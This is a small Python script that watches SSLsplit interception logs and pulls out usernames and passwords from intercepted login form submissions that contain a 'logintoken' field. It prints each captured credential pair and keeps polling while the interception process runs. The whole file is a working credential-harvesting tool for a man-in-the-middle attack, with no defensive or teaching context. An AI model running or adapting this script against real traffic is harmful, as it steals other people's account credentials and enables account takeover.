#!/usr/bin/env python3

import os
import time

print("Parser listening...")

try:
	while True:
		for root, dirs, files in os.walk("./sslsplit-log"):
			for f in files:
				fil_nam = os.path.relpath(os.path.join(root, f), ".")
				if '.bak' in fil_nam:
					continue
				f = open(os.path.relpath(os.path.join(root, f), "."), errors='ignore')
				lines = f.readlines()
				for i in lines:
					if "logintoken" in i:
						lis = i.split('&')
						nam = lis[1].split('=')[1]
						pas = lis[2].split('=')[1]
						print("Username:", nam)
						print("Password:", pas)
						print('')
						break
				f.close()
				os.rename(fil_nam, fil_nam + '.bak')
		time.sleep(1)
		if not os.path.exists('sslsplit.pid'):
			exit(0)
except KeyboardInterrupt:
	exit(0)
